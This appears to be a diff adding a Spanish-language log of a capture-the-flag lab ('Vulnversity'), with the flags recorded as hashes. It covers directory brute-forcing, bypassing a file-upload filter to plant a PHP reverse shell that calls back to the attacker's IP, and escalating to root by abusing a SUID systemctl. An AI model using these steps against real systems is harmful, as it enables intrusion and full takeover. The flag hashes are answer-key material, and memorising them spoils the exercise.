@@ -1,0 +1,37 @@
+d324bd433001e5bdfe39e04d794539c15b51982a5bf6fc78efea46369b7bf956  -
+=== Explotación Vulnversity - Task 4 ===
+1. gobuster dir -u http://10.66.160.168:3333 -w /usr/share/wordlists/dirb/common.txt -o bitacora/gobuster_vulnversity.txt
+   -> Directorio de upload encontrado: /internal/
+
+2. Formulario: POST /internal/index.php, campo file="file"
+   -> Extensión .php bloqueada, .phtml permitida
+
+3. wget php-reverse-shell.php -> renombrado shell.phtml
+   sed -i "s/127.0.0.1/192.168.151.160/" shell.phtml
+
+4. nc -lvnp 1234 (listener)
+   curl -F "file=@shell.phtml" http://10.66.160.168:3333/internal/index.php
+   curl http://10.66.160.168:3333/internal/uploads/shell.phtml
+
+5. Shell obtenida como www-data (uid=33)
+   find / -name user.txt -> /home/bill/user.txt
+   User flag (SHA256): d324bd433001e5bdfe39e04d794539c15b51982a5bf6fc78efea46369b7bf956
+
+NOTA: La instancia original (10.66.160.168) expiró por tiempo; se relanzó la
+máquina en una nueva IP (10.64.131.21) y se repitió el proceso de explotación
+desde el paso 3 en adelante (subida y ejecución del shell).
+
+=== Escalada de Privilegios - Task 5 ===
+1. find / -perm -4000 -type f 2>/dev/null
+   -> Binario SUID anómalo encontrado: /bin/systemctl (no es SUID por defecto en Ubuntu)
+
+2. Explotación vía systemd service malicioso:
+   TF=$(mktemp -u /tmp/XXXXXX).service
+   printf '[Service]\nType=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"\n[Install]\nWantedBy=multi-user.target\n' > $TF
+   /bin/systemctl link $TF
+   /bin/systemctl enable --now <nombre>.service
+   -> /bin/bash queda con SUID root
+
+3. /bin/bash -p -> shell con euid=0(root)
+   find / -name root.txt -> /root/root.txt
+   Root flag (SHA256): cfbc740435ad60030304080e35131ffcaf8ac5f71b65e002f5b546aa3cda7ce8
